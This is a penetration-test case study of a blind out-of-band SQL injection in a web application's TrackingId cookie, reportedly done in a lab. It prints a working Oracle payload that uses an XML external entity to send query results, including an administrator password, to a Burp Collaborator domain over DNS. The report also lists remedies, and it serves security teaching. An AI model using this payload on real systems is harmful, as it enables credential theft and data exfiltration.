# # Blind SQL Injection with Out-of-Band Data Exfiltration

## Introduction:
This case study presents a simulated penetration test of a web application vulnerable to out-of-band (OOB) SQL injection.

## Scope:
Controlled environment, no production systems were tested.

## Executive Summary:
A blind out-of-band SQL injection was identified in the application's tracking cookie. The vulnerability allowed the database server to initiate an external DNS lookup, confirming arbitrary query execution and enabling blind data exfiltration.

This may lead to exfiltration of sensitive data like user credentials and potential access to internal resources.   

## Vulnerability Overview:
Out-of-Band SQL Injection exists when unsanitized user input can be passed into backend SQL that enables database processing. 

When the output is not being displayed within the response (in-band interaction), the attacker may set up a server for database responses.

The working payload suggests Oracle-like behaviour.

## Detection Reasoning (Why OOB)
The request contained a single injectable parameter in the cookie header (TrackingId). All orchestrated In-Band techniques failed as no error messages were being displayed and responses were static. This led to selecting an OOB channel for confirmation. 

The DNS lookup channel was setup that provided logs of the DNS lookup, confirming OOB SQLi.    

## Proof of Concept
A single HTTP request was submitted with the injected payload in the `TrackingId` parameter under the `cookie` header. After the log of DNS lookup was observed at the burp collaborator, it was evident that the injected payload executed successfully.

#### Injected Request

```
GET / HTTP/2
Cookie: TrackingId=<trackid>' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||<SQL_Query>||'.<domain_name>/"> %remote;]>'),'/l') FROM dual)--; session=<sessid>

```
#### Injected Payload

```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(<SQL_QUERY>)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```
#### Out-of-Band Confirmation

A DNS lookup for the unique burp collaborator subdomain containing the injected query result was observed, confirming OOB SQL injection. The timestamps, and the unique payload correlate the DNS interaction with the injected request. The string highlighted in red is the output of SQL query that fetches password for username `administrator`.

<p align="center">
<img width="60%" src="./Screenshot 2026-02-09 130140.png">
</p>


## Impact

An attacker could exploit this vulnerability to:

- Confirm blind SQLi
- Extract sensitive data using DNS-based exfiltration
- Bypass firewall rules that block in-band payloads
- Access internal network resources via database functions

This is a high-risk vulnerability due to its stealthy nature and exploitation feasibility.
## Remedies

- Use parameterized queries
- Disable dangerous database functions
- Restrict outbound DNS/HTTP traffic from database servers
- Enforce principle of least privilege for database users
## Note

This case study is based on a controlled lab environment and written to reflect a real-world web application assessment.
